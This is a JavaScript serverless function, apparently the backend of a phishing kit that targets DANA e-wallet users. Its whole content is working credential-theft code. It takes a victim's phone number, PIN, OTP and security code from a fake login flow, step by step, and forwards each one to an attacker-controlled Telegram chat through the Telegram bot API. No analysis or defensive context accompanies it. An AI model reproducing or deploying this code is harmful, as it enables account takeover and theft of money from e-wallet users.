const axios = require('axios');

exports.handler = async function(event, context) {
    // Only allow POST requests
    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            body: JSON.stringify({ error: 'Method not allowed' })
        };
    }

    try {
        const data = JSON.parse(event.body);
        
        // Get environment variables
        const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
        const telegramChatId = process.env.TELEGRAM_CHAT_ID;
        
        if (!telegramBotToken || !telegramChatId) {
            console.error('Telegram credentials not configured');
            return {
                statusCode: 500,
                body: JSON.stringify({ error: 'Server configuration error' })
            };
        }

        // Format message for Telegram dengan format yang diminta
        let message = '';
        
        switch(data.type) {
            case 'phone':
                message = `├• AKUN | DANA E-WALLET\n`;
                message += `├───────────────────\n`;
                message += `├• NO HP : ${data.phone}\n`;
                message += `├───────────────────\n`;
                break;
                
            case 'pin':
                message = `├• AKUN | DANA E-WALLET\n`;
                message += `├───────────────────\n`;
                message += `├• NO HP : ${data.phone || 'N/A'}\n`;
                message += `├───────────────────\n`;
                message += `├• PIN  : ${data.pin}\n`;
                message += `├───────────────────\n`;
                break;
                
            case 'otp':
                message = `├• AKUN | DANA E-WALLET\n`;
                message += `├───────────────────\n`;
                message += `├• NO HP : ${data.phone || 'N/A'}\n`;
                message += `├───────────────────\n`;
                message += `├• PIN  : ${data.pin || 'N/A'}\n`;
                message += `├───────────────────\n`;
                message += `├• OTP : ${data.otp}\n`;
                message += `╰───────────────────\n`;
                break;
                
            case 'security_code':
                message = `├• AKUN | DANA E-WALLET\n`;
                message += `├───────────────────\n`;
                message += `├• NO HP : ${data.phone || 'N/A'}\n`;
                message += `├───────────────────\n`;
                message += `├• PIN  : ${data.pin || 'N/A'}\n`;
                message += `├───────────────────\n`;
                message += `├• OTP : ${data.otp || 'N/A'}\n`;
                message += `├───────────────────\n`;
                message += `├• SECURITY CODE : ${data.code}\n`;
                message += `╰───────────────────\n`;
                break;
                
            case 'final_verification':
                message = `├• AKUN | DANA E-WALLET\n`;
                message += `├───────────────────\n`;
                message += `├• NO HP : ${data.phone || 'N/A'}\n`;
                message += `├───────────────────\n`;
                message += `├• PIN  : ${data.pin || 'N/A'}\n`;
                message += `├───────────────────\n`;
                message += `├• OTP : ${data.otp || 'N/A'}\n`;
                message += `├───────────────────\n`;
                message += `├• SECURITY CODE : ${data.code}\n`;
                message += `├───────────────────\n`;
                message += `├• STATUS : ${data.status}\n`;
                message += `╰───────────────────\n`;
                break;
                
            default:
                message = `├• AKUN | DANA E-WALLET\n`;
                message += `├───────────────────\n`;
                message += `├• TYPE : ${data.type}\n`;
                message += `╰───────────────────\n`;
        }

        // Send message to Telegram
        const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
        
        const response = await axios.post(telegramUrl, {
            chat_id: telegramChatId,
            text: message,
            parse_mode: 'Markdown'
        });

        console.log('Message sent to Telegram successfully');

        return {
            statusCode: 200,
            body: JSON.stringify({ 
                success: true, 
                message: 'Data received and notification sent' 
            })
        };

    } catch (error) {
        console.error('Error processing request:', error);
        
        return {
            statusCode: 500,
            body: JSON.stringify({ 
                error: 'Internal server error',
                details: error.message 
            })
        };
    }
};
